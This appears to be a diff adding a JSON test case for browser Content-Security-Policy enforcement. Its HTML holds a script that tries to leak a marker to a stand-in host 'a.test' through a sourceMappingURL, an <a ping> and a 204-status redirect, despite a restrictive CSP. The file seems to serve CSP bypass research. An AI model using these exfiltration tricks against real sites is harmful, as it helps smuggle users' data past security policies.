@@ -1,0 +1,17 @@
+```json
+{
+  "c661126": {
+    "url_queue.txt": "https://leak.test/CSP/c661126/main\nhttps://a.test/report/?leak=baseline\n",
+    "leak.test": {
+      "main": {
+        "index.html": "<html>\n  <head>\n    <meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; script-src 'self'; connect-src 'none'\">\n  </head>\n  <body>\n    <script>\n      // SourceMapping POC\n      document.write(`<script src='https://a.test/report/?leak=c661126'>//# sourceMappingURL=https://a.test/report/?leak=c661126</script>`);\n\n      // <a ping>\n      var a = document.createElement('a');\n      a.href='#';\n      a.ping = `https://a.test/report/?leak=c661126`;\n      document.body.appendChild(a);\n      a.click();\n\n      // HTTP 204 status redirect\n      location=`https://leak.test/CSP/c661126/redirect`;\n    </script>\n  </body>\n</html>",
+        "headers.json": "[{\n    \"key\": \"Content-Security-Policy\",\n    \"value\": \"default-src 'self'; script-src 'self'; connect-src 'none'\"\n}]"
+      },
+      "redirect": {
+        "index.html": "",
+        "headers.json": "[{\n    \"key\": \"status\",\n    \"value\": \"204\"\n}]"
+      }
+    }
+  }
+}
+```
